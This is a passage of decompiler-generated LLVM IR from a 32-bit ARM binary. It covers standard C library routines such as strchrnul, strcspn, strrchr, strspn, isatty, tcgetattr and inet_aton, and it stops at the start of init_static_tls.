dec_label_pc_1924c:                               ; preds = %dec_label_pc_19188, %dec_label_pc_19244, %dec_label_pc_1922c, %dec_label_pc_19214, %dec_label_pc_191fc
  br label %dec_label_pc_19250

dec_label_pc_19250:                               ; preds = %dec_label_pc_1917c, %dec_label_pc_19234, %dec_label_pc_1921c, %dec_label_pc_19204, %dec_label_pc_191ec, %dec_label_pc_1924c
  %v1_19254 = phi i32 [ 0, %dec_label_pc_1924c ], [ %v1_19234, %dec_label_pc_19234 ], [ %v1_1921c, %dec_label_pc_1921c ], [ %v1_19204, %dec_label_pc_19204 ], [ %v0_1920c, %dec_label_pc_191ec ], [ %v0_19190, %dec_label_pc_1917c ]
  ret i32 %v1_19254

; uselistorder directives
  uselistorder i32 %v4_191a8, { 1, 0 }
  uselistorder i32 %v2_191a8, { 0, 2, 1 }
  uselistorder i32 %v0_1920c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1919c, { 1, 0 }
  uselistorder i32 %v1_19190, { 1, 0, 2 }
  uselistorder i32 %v0_191943, { 2, 1, 0 }
  uselistorder i32 %v1_19174, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_19250, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1924c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_191ec, { 1, 0 }
  uselistorder label %dec_label_pc_1917c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_19264 = urem i32 %arg1, 256
  %v0_192842 = load i32, i32* @r0, align 4
  %v1_192843 = urem i32 %v0_192842, 4
  %v2_192844 = icmp eq i32 %v1_192843, 0
  br i1 %v2_192844, label %dec_label_pc_1928c, label %dec_label_pc_1926c

dec_label_pc_1926c:                               ; preds = %entry, %dec_label_pc_19280
  %v0_19280 = phi i32 [ %v1_19280, %dec_label_pc_19280 ], [ %v0_192842, %entry ]
  %v1_1926c = inttoptr i32 %v0_19280 to i8*
  %v2_1926c = load i8, i8* %v1_1926c, align 1
  %v3_1926c = zext i8 %v2_1926c to i32
  %v9_19270 = icmp eq i32 %v3_1926c, %v1_19264
  br i1 %v9_19270, label %dec_label_pc_1933c, label %dec_label_pc_19278

dec_label_pc_19278:                               ; preds = %dec_label_pc_1926c
  %v2_19278 = icmp eq i8 %v2_1926c, 0
  br i1 %v2_19278, label %dec_label_pc_1933c, label %dec_label_pc_19280

dec_label_pc_19280:                               ; preds = %dec_label_pc_19278
  %v1_19280 = add i32 %v0_19280, 1
  %v1_19284 = urem i32 %v1_19280, 4
  %v2_19284 = icmp eq i32 %v1_19284, 0
  br i1 %v2_19284, label %dec_label_pc_1928c, label %dec_label_pc_1926c

dec_label_pc_1928c:                               ; preds = %dec_label_pc_19280, %entry
  %v0_19290 = phi i32 [ %v0_192842, %entry ], [ %v1_19280, %dec_label_pc_19280 ]
  %v4_1928c = mul nuw nsw i32 %v1_19264, 256
  %v5_1928c = or i32 %v4_1928c, %v1_19264
  %v4_19294 = mul i32 %v5_1928c, 65536
  %v5_19294 = or i32 %v4_19294, %v5_1928c
  br label %dec_label_pc_19298

dec_label_pc_19298:                               ; preds = %dec_label_pc_19334, %dec_label_pc_192d4, %dec_label_pc_1928c
  %v0_192fc = phi i32 [ %v0_19290, %dec_label_pc_1928c ], [ %v4_19298, %dec_label_pc_192d4 ], [ %v4_19298, %dec_label_pc_19334 ]
  %v1_19298 = inttoptr i32 %v0_192fc to i32*
  %v2_19298 = load i32, i32* %v1_19298, align 4
  %v4_19298 = add i32 %v0_192fc, 4
  %v2_192a0 = xor i32 %v2_19298, %v5_19294
  %v2_192ac = add i32 %v2_19298, 2130640639
  %v1_192b0 = sub i32 -1, %v2_19298
  %v2_192b4 = xor i32 %v2_192ac, %v1_192b0
  %v2_192c0 = and i32 %v2_192b4, -2130640640
  store i32 %v2_192c0, i32* @r1, align 4
  %v2_192c8 = icmp eq i32 %v2_192c0, 0
  br i1 %v2_192c8, label %dec_label_pc_192d4, label %dec_label_pc_192dc

dec_label_pc_192d4:                               ; preds = %dec_label_pc_19298
  %v2_192a4 = add i32 %v2_192a0, 2130640639
  %v1_192bc = sub i32 -1, %v2_192a0
  %v2_192c4 = xor i32 %v2_192a4, %v1_192bc
  %v2_192cc = and i32 %v2_192c4, -2130640640
  %v2_192d4 = icmp eq i32 %v2_192cc, 0
  br i1 %v2_192d4, label %dec_label_pc_19298, label %dec_label_pc_192dc

dec_label_pc_192dc:                               ; preds = %dec_label_pc_19298, %dec_label_pc_192d4
  %v2_192dc = inttoptr i32 %v0_192fc to i8*
  %v3_192dc = load i8, i8* %v2_192dc, align 1
  %v4_192dc = zext i8 %v3_192dc to i32
  %v9_192e0 = icmp eq i32 %v4_192dc, %v1_19264
  br i1 %v9_192e0, label %dec_label_pc_1933c, label %dec_label_pc_192ec

dec_label_pc_192ec:                               ; preds = %dec_label_pc_192dc
  %v2_192ec = icmp eq i8 %v3_192dc, 0
  br i1 %v2_192ec, label %dec_label_pc_1933c, label %dec_label_pc_192f4

dec_label_pc_192f4:                               ; preds = %dec_label_pc_192ec
  %v1_192f4 = add i32 %v0_192fc, 1
  %v2_192f4 = inttoptr i32 %v1_192f4 to i8*
  %v3_192f4 = load i8, i8* %v2_192f4, align 1
  %v4_192f4 = zext i8 %v3_192f4 to i32
  %v9_192f8 = icmp eq i32 %v4_192f4, %v1_19264
  br i1 %v9_192f8, label %dec_label_pc_1933c, label %dec_label_pc_19304

dec_label_pc_19304:                               ; preds = %dec_label_pc_192f4
  %v2_19304 = icmp eq i8 %v3_192f4, 0
  br i1 %v2_19304, label %dec_label_pc_1933c, label %dec_label_pc_1930c

dec_label_pc_1930c:                               ; preds = %dec_label_pc_19304
  %v1_1930c = add i32 %v0_192fc, 2
  %v2_1930c = inttoptr i32 %v1_1930c to i8*
  %v3_1930c = load i8, i8* %v2_1930c, align 1
  %v4_1930c = zext i8 %v3_1930c to i32
  %v9_19310 = icmp eq i32 %v4_1930c, %v1_19264
  br i1 %v9_19310, label %dec_label_pc_1933c, label %dec_label_pc_1931c

dec_label_pc_1931c:                               ; preds = %dec_label_pc_1930c
  %v2_1931c = icmp eq i8 %v3_1930c, 0
  br i1 %v2_1931c, label %dec_label_pc_1933c, label %dec_label_pc_19324

dec_label_pc_19324:                               ; preds = %dec_label_pc_1931c
  %v1_19324 = add i32 %v0_192fc, 3
  %v2_19324 = inttoptr i32 %v1_19324 to i8*
  %v3_19324 = load i8, i8* %v2_19324, align 1
  %v4_19324 = zext i8 %v3_19324 to i32
  %v9_19328 = icmp eq i32 %v4_19324, %v1_19264
  br i1 %v9_19328, label %dec_label_pc_1933c, label %dec_label_pc_19334

dec_label_pc_19334:                               ; preds = %dec_label_pc_19324
  %v2_19334 = icmp eq i8 %v3_19324, 0
  br i1 %v2_19334, label %dec_label_pc_1933c, label %dec_label_pc_19298

dec_label_pc_1933c:                               ; preds = %dec_label_pc_19278, %dec_label_pc_1926c, %dec_label_pc_19334, %dec_label_pc_19324, %dec_label_pc_1931c, %dec_label_pc_1930c, %dec_label_pc_19304, %dec_label_pc_192f4, %dec_label_pc_192ec, %dec_label_pc_192dc
  %v1_19340 = phi i32 [ %v1_19324, %dec_label_pc_19334 ], [ %v1_19324, %dec_label_pc_19324 ], [ %v1_1930c, %dec_label_pc_1931c ], [ %v1_1930c, %dec_label_pc_1930c ], [ %v1_192f4, %dec_label_pc_19304 ], [ %v1_192f4, %dec_label_pc_192f4 ], [ %v0_192fc, %dec_label_pc_192ec ], [ %v0_192fc, %dec_label_pc_192dc ], [ %v0_19280, %dec_label_pc_1926c ], [ %v0_19280, %dec_label_pc_19278 ]
  ret i32 %v1_19340

; uselistorder directives
  uselistorder i32 %v4_19298, { 1, 0 }
  uselistorder i32 %v2_19298, { 0, 2, 1 }
  uselistorder i32 %v0_192fc, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1928c, { 1, 0 }
  uselistorder i32 %v1_19280, { 1, 0, 2 }
  uselistorder i32 %v0_192842, { 2, 1, 0 }
  uselistorder i32 %v1_19264, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1933c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_192dc, { 1, 0 }
  uselistorder label %dec_label_pc_1926c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1934c = load i32, i32* @r4, align 4
  store i32 %v3_1934c, i32* %stack_var_-16, align 4
  %v6_1934c = load i32, i32* @r5, align 4
  %v9_1934c = load i32, i32* @r6, align 4
  %v0_19350 = load i32, i32* @r0, align 4
  %v0_19354 = load i32, i32* @r1, align 4
  store i32 %v0_19354, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_193708 = inttoptr i32 %v0_19350 to i8*
  %v2_193709 = load i8, i8* %v1_193708, align 1
  %v3_1937010 = zext i8 %v2_193709 to i32
  store i32 %v3_1937010, i32* @r1, align 4
  %v2_1937411 = icmp eq i8 %v2_193709, 0
  store i32 %v0_19354, i32* @r0, align 4
  %v1_1937c12 = add i32 %v0_19350, 1
  store i32 %v1_1937c12, i32* @r4, align 4
  br i1 %v2_1937411, label %dec_label_pc_19384, label %dec_label_pc_19360

dec_label_pc_19360:                               ; preds = %entry, %dec_label_pc_1936c
  %v3_1937014 = phi i32 [ %v3_19370, %dec_label_pc_1936c ], [ %v3_1937010, %entry ]
  %v0_1937813 = phi i32 [ %v0_19378.pre, %dec_label_pc_1936c ], [ %v0_19354, %entry ]
  %v2_19360 = call i32 @__GI_strchr(i32 %v0_1937813, i32 %v3_1937014)
  %v2_19364 = icmp eq i32 %v2_19360, 0
  %v0_1936c = load i32, i32* @r5, align 4
  br i1 %v2_19364, label %dec_label_pc_1936c, label %dec_label_pc_19384

dec_label_pc_1936c:                               ; preds = %dec_label_pc_19360
  %v1_1936c = add i32 %v0_1936c, 1
  %v0_19370.pre = load i32, i32* @r4, align 4
  %v0_19378.pre = load i32, i32* @r6, align 4
  store i32 %v1_1936c, i32* @r5, align 4
  %v1_19370 = inttoptr i32 %v0_19370.pre to i8*
  %v2_19370 = load i8, i8* %v1_19370, align 1
  %v3_19370 = zext i8 %v2_19370 to i32
  store i32 %v3_19370, i32* @r1, align 4
  %v2_19374 = icmp eq i8 %v2_19370, 0
  store i32 %v0_19378.pre, i32* @r0, align 4
  %v1_1937c = add i32 %v0_19370.pre, 1
  store i32 %v1_1937c, i32* @r4, align 4
  br i1 %v2_19374, label %dec_label_pc_19384, label %dec_label_pc_19360

dec_label_pc_19384:                               ; preds = %dec_label_pc_1936c, %dec_label_pc_19360, %entry
  %v0_19384 = phi i32 [ 0, %entry ], [ %v0_1936c, %dec_label_pc_19360 ], [ %v1_1936c, %dec_label_pc_1936c ]
  %v2_19388 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19388, i32* @r4, align 4
  store i32 %v6_1934c, i32* @r5, align 4
  store i32 %v9_1934c, i32* @r6, align 4
  ret i32 %v0_19384

; uselistorder directives
  uselistorder i32 %v3_19370, { 1, 0 }
  uselistorder i32 %v0_19378.pre, { 1, 0 }
  uselistorder i32 %v0_19370.pre, { 1, 0 }
  uselistorder label %dec_label_pc_19360, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_19394 = urem i32 %arg2, 256
  store i32 %v1_19394, i32* @r4, align 4
  %v2_19394 = icmp eq i32 %v1_19394, 0
  br i1 %v2_19394, label %dec_label_pc_193a8, label %dec_label_pc_193bc.preheader

dec_label_pc_193bc.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_193c43 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_19394)
  %v2_193c85 = icmp eq i32 %v2_193c43, 0
  br i1 %v2_193c85, label %dec_label_pc_193d0, label %dec_label_pc_193b4

dec_label_pc_193a8:                               ; preds = %entry
  %v2_193ac = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_193d4

dec_label_pc_193b4:                               ; preds = %dec_label_pc_193bc.preheader, %dec_label_pc_193b4
  %v2_193c46 = phi i32 [ %v2_193c4, %dec_label_pc_193b4 ], [ %v2_193c43, %dec_label_pc_193bc.preheader ]
  store i32 %v2_193c46, i32* @r5, align 4
  %v1_193b8 = add i32 %v2_193c46, 1
  store i32 %v1_193b8, i32* @r0, align 4
  %v0_193c0 = load i32, i32* @r4, align 4
  %v2_193c4 = call i32 @__GI_strchr(i32 %v1_193b8, i32 %v0_193c0)
  %v2_193c8 = icmp eq i32 %v2_193c4, 0
  br i1 %v2_193c8, label %dec_label_pc_193d0, label %dec_label_pc_193b4

dec_label_pc_193d0:                               ; preds = %dec_label_pc_193b4, %dec_label_pc_193bc.preheader
  %v0_193d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_193d4

dec_label_pc_193d4:                               ; preds = %dec_label_pc_193a8, %dec_label_pc_193d0
  %storemerge = phi i32 [ %v2_193ac, %dec_label_pc_193a8 ], [ %v0_193d0, %dec_label_pc_193d0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_193c4, { 1, 0 }
  uselistorder i32 %v1_193b8, { 1, 0 }
  uselistorder i32 %v1_19394, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_193d4, { 1, 0 }
  uselistorder label %dec_label_pc_193b4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_194102 = load i32, i32* @r0, align 4
  %v1_194103 = inttoptr i32 %v0_194102 to i8*
  %v2_194104 = load i8, i8* %v1_194103, align 1
  %v2_194146 = icmp eq i8 %v2_194104, 0
  br i1 %v2_194146, label %dec_label_pc_19420, label %dec_label_pc_193f4.preheader

dec_label_pc_193ec:                               ; preds = %dec_label_pc_193f4
  %v1_193fc = add i32 %v0_193fc, 1
  %v9_193ec = icmp eq i8 %v0_193ec10.in, %v2_193f4
  br i1 %v9_193ec, label %dec_label_pc_19408, label %dec_label_pc_193f4

dec_label_pc_193f4:                               ; preds = %dec_label_pc_193f4.preheader, %dec_label_pc_193ec
  %v0_193fc = phi i32 [ %tmp, %dec_label_pc_193f4.preheader ], [ %v1_193fc, %dec_label_pc_193ec ]
  %v1_193f4 = inttoptr i32 %v0_193fc to i8*
  %v2_193f4 = load i8, i8* %v1_193f4, align 1
  %v2_193f8 = icmp eq i8 %v2_193f4, 0
  br i1 %v2_193f8, label %dec_label_pc_19420, label %dec_label_pc_193ec

dec_label_pc_19408:                               ; preds = %dec_label_pc_193ec
  %v1_19408 = add i32 %v0_19408, 1
  %v1_1940c = add i32 %v0_1940c, 1
  %v1_19410 = inttoptr i32 %v1_1940c to i8*
  %v2_19410 = load i8, i8* %v1_19410, align 1
  %v2_19414 = icmp eq i8 %v2_19410, 0
  br i1 %v2_19414, label %dec_label_pc_19420, label %dec_label_pc_193f4.preheader

dec_label_pc_193f4.preheader:                     ; preds = %entry, %dec_label_pc_19408
  %v0_1940c = phi i32 [ %v1_1940c, %dec_label_pc_19408 ], [ %v0_194102, %entry ]
  %v0_19408 = phi i32 [ %v1_19408, %dec_label_pc_19408 ], [ 0, %entry ]
  %v0_193ec10.in = phi i8 [ %v2_19410, %dec_label_pc_19408 ], [ %v2_194104, %entry ]
  br label %dec_label_pc_193f4

dec_label_pc_19420:                               ; preds = %dec_label_pc_19408, %dec_label_pc_193f4, %entry
  %v0_19420 = phi i32 [ 0, %entry ], [ %v0_19408, %dec_label_pc_193f4 ], [ %v1_19408, %dec_label_pc_19408 ]
  ret i32 %v0_19420

; uselistorder directives
  uselistorder i8 %v2_193f4, { 1, 0 }
  uselistorder i32 %v0_193fc, { 1, 0 }
  uselistorder label %dec_label_pc_193f4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_19434 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_19434, i32* @r1, align 4
  %v0_19438 = call i32 @__GI_tcgetattr()
  %v1_1943c = sub i32 1, %v0_19438
  %v2_1943c = icmp ult i32 %v0_19438, 2
  br i1 %v2_1943c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_1944c = phi i32 [ %v1_1943c, %entry ], [ 0, %bb ]
  ret i32 %v1_1944c

; uselistorder directives
  uselistorder i32 %v0_19438, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_4()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_19450 = load i32, i32* @r4, align 4
  %v6_19450 = load i32, i32* @r5, align 4
  %v9_19450 = load i32, i32* @r6, align 4
  %v2_19458 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1945c = load i32, i32* @r1, align 4
  store i32 %v0_1945c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_19468 = load i32, i32* @r0, align 4
  %v3_19468 = call i32 @ioctl(i32 %v0_19468, i32 21505, i32 %v2_19458)
  store i32 %v3_19468, i32* %r0.global-to-local, align 4
  store i32 %v3_19468, i32* @r5, align 4
  %v2_1946c = icmp eq i32 %v3_19468, 0
  br i1 %v2_1946c, label %dec_label_pc_19474, label %dec_label_pc_194b8

dec_label_pc_19474:                               ; preds = %entry
  %v4_19480 = zext i8 %tmp to i32
  store i32 %v4_19480, i32* @ip, align 4
  %v3_19484 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_19484, i32* @r3, align 4
  %v1_19488 = load i32, i32* @r4, align 4
  %v2_19488 = add i32 %v1_19488, 4
  %v3_19488 = inttoptr i32 %v2_19488 to i32*
  %v0_1948c = load i32, i32* %r1.global-to-local, align 4
  %v1_1948c = load i32, i32* @r4, align 4
  %v2_1948c = add i32 %v1_1948c, 8
  %v3_1948c = inttoptr i32 %v2_1948c to i32*
  store i32 %v0_1948c, i32* %v3_1948c, align 4
  %v0_19490 = load i32, i32* %r0.global-to-local, align 4
  %v1_19490 = load i32, i32* @r4, align 4
  %v2_19490 = add i32 %v1_19490, 12
  %v3_19490 = inttoptr i32 %v2_19490 to i32*
  store i32 %v0_19490, i32* %v3_19490, align 4
  %v2_19494 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_19494, i32* @r1, align 4
  %v1_1949c = load i32, i32* @r4, align 4
  %v2_1949c = inttoptr i32 %v1_1949c to i32*
  store i32 %v3_19484, i32* %v2_1949c, align 4
  %v0_194a0 = load i32, i32* @ip, align 4
  %v1_194a0 = trunc i32 %v0_194a0 to i8
  %v2_194a0 = load i32, i32* @r4, align 4
  %v3_194a0 = add i32 %v2_194a0, 16
  %v4_194a0 = inttoptr i32 %v3_194a0 to i8*
  store i8 %v1_194a0, i8* %v4_194a0, align 1
  %v0_194a4 = load i32, i32* @r4, align 4
  %v1_194a4 = add i32 %v0_194a4, 17
  store i32 %v1_194a4, i32* %r0.global-to-local, align 4
  %v4_194a8 = call i32 @__GI_mempcpy(i32 %v1_194a4, i32 %v2_19494, i32 19, i32 %v3_19484)
  store i32 %v4_194a8, i32* %r0.global-to-local, align 4
  %v0_194ac = load i32, i32* @r5, align 4
  store i32 %v0_194ac, i32* %r1.global-to-local, align 4
  %v3_194b4 = inttoptr i32 %v4_194a8 to i8*
  %v4_194b4 = call i32 @__GI_memset(i8* %v3_194b4, i32 %v0_194ac, i32 13)
  store i32 %v4_194b4, i32* %r0.global-to-local, align 4
  %v0_194b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_194b8

dec_label_pc_194b8:                               ; preds = %entry, %dec_label_pc_19474
  %v0_194b8 = phi i32 [ %v3_19468, %entry ], [ %v0_194b8.pre, %dec_label_pc_19474 ]
  store i32 %v0_194b8, i32* %r0.global-to-local, align 4
  store i32 %v3_19450, i32* @r4, align 4
  store i32 %v6_19450, i32* @r5, align 4
  store i32 %v9_19450, i32* @r6, align 4
  ret i32 %v0_194b8

; uselistorder directives
  uselistorder i32 %v0_194b8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 10, 1, 2, 11, 12, 3, 13, 4, 14, 5, 15, 16, 17, 6, 18, 7, 8, 19, 9, 20, 21, 22, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_194b8, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_194cc = load i32, i32* @r4, align 4
  store i32 %v3_194cc, i32* %stack_var_-28, align 4
  %v0_194d4 = load i32, i32* @r0, align 4
  %v2_194d4 = icmp eq i32 %v0_194d4, 0
  %v0_194dc = load i32, i32* @r1, align 4
  br i1 %v2_194d4, label %dec_label_pc_195b0, label %dec_label_pc_194e4

dec_label_pc_194e4:                               ; preds = %entry
  br label %dec_label_pc_194fc

dec_label_pc_194fc:                               ; preds = %dec_label_pc_194e4, %dec_label_pc_19574
  %v1_19574 = phi i32 [ 0, %dec_label_pc_194e4 ], [ %v5_19574, %dec_label_pc_19574 ]
  %v0_19578 = phi i32 [ 1, %dec_label_pc_194e4 ], [ %v1_19578, %dec_label_pc_19574 ]
  %v0_194fc = phi i32 [ %v0_194d4, %dec_label_pc_194e4 ], [ %v0_194fc13, %dec_label_pc_19574 ]
  %v1_194fc = inttoptr i32 %v0_194fc to i8*
  %v2_194fc = load i8, i8* %v1_194fc, align 1
  %v3_194fc = zext i8 %v2_194fc to i32
  %v4_19500 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 276) to i32*), align 4
  %v2_19504 = mul nuw nsw i32 %v3_194fc, 2
  %v2_19508 = add i32 %v2_19504, %v4_19500
  %v3_19508 = inttoptr i32 %v2_19508 to i16*
  %v4_19508 = load i16, i16* %v3_19508, align 2
  %v1_1950c = and i16 %v4_19508, 8
  %v2_1950c = icmp eq i16 %v1_1950c, 0
  br i1 %v2_1950c, label %dec_label_pc_195b0, label %dec_label_pc_19514

dec_label_pc_19514:                               ; preds = %dec_label_pc_194fc
  br label %dec_label_pc_19534

dec_label_pc_1951c:                               ; preds = %dec_label_pc_19534
  %v2_1951c = mul i32 %v0_19574, 10
  %v1_19520 = add i32 %v2_1951c, -48
  %v2_19524 = add i32 %v3_19534, %v1_19520
  %v8_1952c = icmp sgt i32 %v2_19524, 255
  br i1 %v8_1952c, label %dec_label_pc_195b0, label %dec_label_pc_19530

dec_label_pc_19530:                               ; preds = %dec_label_pc_1951c
  %v1_19530 = add i32 %v0_19564, 1
  store i32 %v1_19530, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19534

dec_label_pc_19534:                               ; preds = %dec_label_pc_19514, %dec_label_pc_19530
  %v0_19574 = phi i32 [ 0, %dec_label_pc_19514 ], [ %v2_19524, %dec_label_pc_19530 ]
  %v0_19564 = phi i32 [ %v0_194fc, %dec_label_pc_19514 ], [ %v1_19530, %dec_label_pc_19530 ]
  %v1_19534 = inttoptr i32 %v0_19564 to i8*
  %v2_19534 = load i8, i8* %v1_19534, align 1
  %v3_19534 = zext i8 %v2_19534 to i32
  %v2_19538 = mul nuw nsw i32 %v3_19534, 2
  %v2_1953c = add i32 %v2_19538, %v4_19500
  %v3_1953c = inttoptr i32 %v2_1953c to i16*
  %v4_1953c = load i16, i16* %v3_1953c, align 2
  %v6_1953c = zext i16 %v4_1953c to i32
  %v1_19540 = and i32 %v6_1953c, 8
  %v2_19540 = icmp eq i32 %v1_19540, 0
  br i1 %v2_19540, label %dec_label_pc_19548, label %dec_label_pc_1951c

dec_label_pc_19548:                               ; preds = %dec_label_pc_19534
  %v7_19548 = icmp eq i32 %v0_19578, 4
  br i1 %v7_19548, label %dec_label_pc_19560, label %dec_label_pc_19550

dec_label_pc_19550:                               ; preds = %dec_label_pc_19548
  %v7_19550 = icmp eq i8 %v2_19534, 46
  br i1 %v7_19550, label %dec_label_pc_19558, label %dec_label_pc_195b0

dec_label_pc_19558:                               ; preds = %dec_label_pc_19550
  %v1_19558 = add i32 %v0_19564, 1
  store i32 %v1_19558, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19574

dec_label_pc_19560:                               ; preds = %dec_label_pc_19548
  %v2_19560 = icmp eq i8 %v2_19534, 0
  %v1_19564 = add i32 %v0_19564, 1
  store i32 %v1_19564, i32* %r0.global-to-local, align 4
  br i1 %v2_19560, label %dec_label_pc_19574, label %dec_label_pc_1956c

dec_label_pc_1956c:                               ; preds = %dec_label_pc_19560
  %v1_1956c = and i32 %v6_1953c, 32
  %v2_1956c = icmp eq i32 %v1_1956c, 0
  br i1 %v2_1956c, label %dec_label_pc_195b0, label %dec_label_pc_19574

dec_label_pc_19574:                               ; preds = %dec_label_pc_1956c, %dec_label_pc_19560, %dec_label_pc_19558
  %v0_194fc13 = phi i32 [ %v1_19564, %dec_label_pc_1956c ], [ %v1_19564, %dec_label_pc_19560 ], [ %v1_19558, %dec_label_pc_19558 ]
  %v4_19574 = mul i32 %v1_19574, 256
  %v5_19574 = or i32 %v0_19574, %v4_19574
  %v1_19578 = add nuw nsw i32 %v0_19578, 1
  %v7_19580 = icmp slt i32 %v1_19578, 5
  br i1 %v7_19580, label %dec_label_pc_194fc, label %dec_label_pc_19584

dec_label_pc_19584:                               ; preds = %dec_label_pc_19574
  %v2_19584 = icmp eq i32 %v0_194dc, 0
  br i1 %v2_19584, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_19584
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_195b4

bb:                                               ; preds = %dec_label_pc_19584
  %v4_19588 = udiv i32 %v5_19574, 16777216
  %v2_1958c = udiv i32 %v5_19574, 256
  %v5_19590 = and i32 %v2_1958c, 65280
  %v2_19594 = and i32 %v5_19574, 65280
  %v5_19598 = mul nuw nsw i32 %v2_19594, 256
  %v5_1959c = mul i32 %v0_19574, 16777216
  %v6_19590 = or i32 %v4_19588, %v5_1959c
  %v6_19598 = or i32 %v6_19590, %v5_19590
  %v6_1959c = or i32 %v6_19598, %v5_19598
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_195a8 = inttoptr i32 %v0_194dc to i32*
  store i32 %v6_1959c, i32* %v3_195a8, align 4
  %v2_195b4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_195b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_195b4

dec_label_pc_195b0:                               ; preds = %dec_label_pc_19550, %dec_label_pc_1956c, %dec_label_pc_194fc, %dec_label_pc_1951c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_195b4

dec_label_pc_195b4:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_195b0
  %v1_195b8 = phi i32 [ %v1_195b8.pre, %bb ], [ 0, %dec_label_pc_195b0 ], [ 1, %.thread8.thread ]
  %v2_195b4 = phi i32 [ %v2_195b4.pre, %bb ], [ %v3_194cc, %dec_label_pc_195b0 ], [ %v3_194cc, %.thread8.thread ]
  store i32 %v2_195b4, i32* @r4, align 4
  ret i32 %v1_195b8

; uselistorder directives
  uselistorder i32 %v1_19578, { 1, 0 }
  uselistorder i32 %v5_19574, { 2, 0, 1, 3 }
  uselistorder i32 %v0_19564, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 65280, { 66, 0, 5, 1, 2, 6, 7, 8, 9, 10, 36, 44, 45, 46, 11, 12, 13, 47, 48, 14, 15, 16, 17, 37, 49, 3, 50, 51, 18, 19, 38, 52, 53, 39, 20, 21, 22, 23, 24, 54, 55, 56, 57, 40, 41, 42, 4, 58, 59, 25, 60, 26, 27, 28, 29, 43, 61, 30, 31, 32, 62, 33, 34, 35, 63, 64, 65 }
  uselistorder i8 46, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 255, { 4, 5, 0, 1, 2, 16, 17, 19, 18, 20, 6, 21, 3, 9, 22, 10, 23, 7, 24, 8, 25, 13, 26, 14, 27, 11, 28, 12, 29, 15, 30 }
  uselistorder i16 0, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_195b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_195b0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_19534, { 1, 0 }
  uselistorder label %dec_label_pc_194fc, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_195d0 = load i32, i32* @r4, align 4
